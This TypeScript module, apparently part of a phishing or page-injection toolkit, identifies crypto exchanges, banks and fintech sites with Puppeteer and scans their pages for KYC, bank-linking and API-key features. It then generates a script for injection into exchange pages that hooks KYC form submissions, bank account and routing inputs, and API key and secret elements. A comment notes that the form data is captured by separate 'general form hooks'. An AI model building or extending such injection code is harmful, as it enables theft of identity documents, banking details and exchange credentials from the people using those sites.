/**
 * Universal Platform Detector — 190+ Platforms
 *
 * Detects platform type from 190+ database:
 * CEX, DEX, Wallet, Bridge, Lending, Bank, Fintech
 */

import type { Page } from 'puppeteer'
import { getPlatformConfig, type PlatformCategory } from './platform-database.js'

export type PlatformType = PlatformCategory

export interface CexFeatures {
  hasKyc: boolean
  hasFiatDeposit: boolean
  hasBankLinking: boolean
  hasWithdrawalLimits: boolean
  hasApiKeys: boolean
  hasMargin: boolean
  hasStaking: boolean
}

export interface BankFeatures {
  hasKyc: boolean
  hasTransfers: boolean
  hasLoanApplication: boolean
  hasCreditCards: boolean
  hasInvestments: boolean
}

export interface FintechFeatures {
  hasKyc: boolean
  hasPaymentProcessing: boolean
  hasCardLinking: boolean
  hasInvestments: boolean
  hasMoneyTransfer: boolean
}

export interface PlatformDetection {
  type: PlatformType
  platform: string
  isSupported: boolean
  cexFeatures?: CexFeatures
  bankFeatures?: BankFeatures
  fintechFeatures?: FintechFeatures
}

export async function detectPlatformType(page: Page): Promise<PlatformDetection> {
  console.info('[PLATFORM-DETECTOR] Analyzing platform type...')

  const hostname = page.url().split('/')[2].replace('www.', '')
  console.info(`[PLATFORM-DETECTOR] Hostname: ${hostname}`)

  // Lookup in database
  const platformConfig = getPlatformConfig(hostname)

  let type: PlatformType = 'other'
  let platform = hostname
  let isSupported = false

  if (platformConfig) {
    type = platformConfig.category
    platform = platformConfig.name
    isSupported = true
    console.info(`[PLATFORM-DETECTOR] ✅ Found in database: ${platform} (${type})`)
  } else {
    console.warn(`[PLATFORM-DETECTOR] ⚠️  Platform not in database, treating as: other`)
  }

  const detection: PlatformDetection = {
    type,
    platform,
    isSupported,
  }

  // Detect category-specific features
  if (type === 'cex' && isSupported) {
    detection.cexFeatures = await detectCexFeatures(page)
  }

  if (type === 'bank' && isSupported) {
    detection.bankFeatures = await detectBankFeatures(page)
  }

  if (type === 'fintech' && isSupported) {
    detection.fintechFeatures = await detectFintechFeatures(page)
  }

  console.info(`[PLATFORM-DETECTOR] Detected: ${type} - ${platform} (supported: ${isSupported})`)
  return detection
}

async function detectCexFeatures(page: Page): Promise<CexFeatures> {
  console.info('[PLATFORM-DETECTOR] Scanning for CEX-specific features...')

  const features = await page.evaluate(() => {
    const pageText = document.body.textContent?.toLowerCase() || ''
    const pageHtml = document.body.innerHTML.toLowerCase()

    return {
      hasKyc:
        pageText.includes('kyc') ||
        pageText.includes('verification') ||
        pageText.includes('identity') ||
        pageHtml.includes('kyc'),

      hasFiatDeposit:
        pageText.includes('fiat') ||
        pageText.includes('deposit') ||
        pageText.includes('bank') ||
        pageText.includes('credit card'),

      hasBankLinking:
        pageText.includes('bank account') ||
        pageText.includes('wire') ||
        pageText.includes('ach') ||
        pageHtml.includes('bank-link'),

      hasWithdrawalLimits:
        pageText.includes('withdrawal limit') ||
        pageText.includes('daily limit') ||
        pageText.includes('max withdrawal'),

      hasApiKeys:
        pageText.includes('api key') ||
        pageText.includes('api secret') ||
        pageHtml.includes('api-key'),

      hasMargin:
        pageText.includes('margin') ||
        pageText.includes('leverage') ||
        pageText.includes('futures'),

      hasStaking:
        pageText.includes('stake') ||
        pageText.includes('staking') ||
        pageText.includes('yield'),
    }
  })

  return features
}

async function detectBankFeatures(page: Page): Promise<BankFeatures> {
  console.info('[PLATFORM-DETECTOR] Scanning for Bank-specific features...')

  const features = await page.evaluate(() => {
    const pageText = document.body.textContent?.toLowerCase() || ''
    const pageHtml = document.body.innerHTML.toLowerCase()

    return {
      hasKyc:
        pageText.includes('kyc') ||
        pageText.includes('verification') ||
        pageText.includes('identity') ||
        pageText.includes('aml'),

      hasTransfers:
        pageText.includes('transfer') ||
        pageText.includes('send money') ||
        pageText.includes('wire transfer'),

      hasLoanApplication:
        pageText.includes('loan') ||
        pageText.includes('mortgage') ||
        pageText.includes('credit') ||
        pageHtml.includes('loan-app'),

      hasCreditCards:
        pageText.includes('credit card') ||
        pageText.includes('debit card') ||
        pageHtml.includes('card'),

      hasInvestments:
        pageText.includes('invest') ||
        pageText.includes('portfolio') ||
        pageText.includes('stocks'),
    }
  })

  return features
}

async function detectFintechFeatures(page: Page): Promise<FintechFeatures> {
  console.info('[PLATFORM-DETECTOR] Scanning for Fintech-specific features...')

  const features = await page.evaluate(() => {
    const pageText = document.body.textContent?.toLowerCase() || ''
    const pageHtml = document.body.innerHTML.toLowerCase()

    return {
      hasKyc:
        pageText.includes('kyc') ||
        pageText.includes('verification') ||
        pageText.includes('identity'),

      hasPaymentProcessing:
        pageText.includes('payment') ||
        pageText.includes('checkout') ||
        pageText.includes('billing'),

      hasCardLinking:
        pageText.includes('card') ||
        pageText.includes('bank account') ||
        pageText.includes('payment method'),

      hasInvestments:
        pageText.includes('invest') ||
        pageText.includes('trade') ||
        pageText.includes('portfolio'),

      hasMoneyTransfer:
        pageText.includes('transfer') ||
        pageText.includes('send money') ||
        pageText.includes('remittance'),
    }
  })

  return features
}

export function buildCexModeInjectionCode(detection: PlatformDetection): string {
  if (detection.type !== 'cex') {
    return ''
  }

  return `
<script>
// CEX-specific feature handling
(function() {
  var PLATFORM = '${detection.platform}';
  var FEATURES = ${JSON.stringify(detection.cexFeatures)};

  // Monitor for KYC flow
  if (FEATURES.hasKyc) {
    console.log('[CEX-MODE] KYC flow detected');

    // Hook KYC form submissions
    document.addEventListener('submit', function(e) {
      var form = e.target;
      if (form && form.innerHTML.toLowerCase().includes('verify') || form.innerHTML.toLowerCase().includes('kyc')) {
        console.log('[CEX-MODE] KYC form submitted');
        // Form data will be captured by general form hooks
      }
    }, true);
  }

  // Monitor for bank linking
  if (FEATURES.hasBankLinking) {
    console.log('[CEX-MODE] Bank linking flow detected');

    // Hook bank account inputs
    var bankInputs = document.querySelectorAll('input[placeholder*="account"], input[placeholder*="routing"]');
    bankInputs.forEach(function(input) {
      input.addEventListener('change', function() {
        console.log('[CEX-MODE] Bank account input changed');
      });
    });
  }

  // Monitor for fiat deposits
  if (FEATURES.hasFiatDeposit) {
    console.log('[CEX-MODE] Fiat deposit flow detected');
  }

  // Monitor for API key generation
  if (FEATURES.hasApiKeys) {
    console.log('[CEX-MODE] API key generation available');

    // Hook API key displays
    var keyElements = document.querySelectorAll('[class*="key"], [class*="secret"]');
    keyElements.forEach(function(el) {
      if (el.textContent && el.textContent.length > 20) {
        console.log('[CEX-MODE] API key element found');
      }
    });
  }

  console.log('[CEX-MODE] CEX mode enabled for ' + PLATFORM);
})();
</script>
`
}

export function generateCexFlowDetectionCode(): string {
  return `
// CEX-specific flow detection
var CEX_FLOWS = {
  kyc: {
    name: 'KYC Verification',
    steps: ['Identity upload', 'Address verification', 'Approved'],
  },
  bankLink: {
    name: 'Bank Account Linking',
    steps: ['Account number', 'Routing number', 'Verification', 'Linked'],
  },
  fiatDeposit: {
    name: 'Fiat Deposit',
    steps: ['Select amount', 'Choose payment method', 'Complete payment', 'Deposited'],
  },
  apiKey: {
    name: 'API Key Generation',
    steps: ['Generate key', 'Copy secret', 'Confirm', 'Active'],
  },
};

function detectCexFlows() {
  var pageText = document.body.textContent.toLowerCase();
  var detected = [];

  if (pageText.includes('kyc') || pageText.includes('verification')) {
    detected.push('kyc');
  }
  if (pageText.includes('bank')) {
    detected.push('bankLink');
  }
  if (pageText.includes('fiat') || pageText.includes('deposit')) {
    detected.push('fiatDeposit');
  }
  if (pageText.includes('api')) {
    detected.push('apiKey');
  }

  return detected;
}
`
}
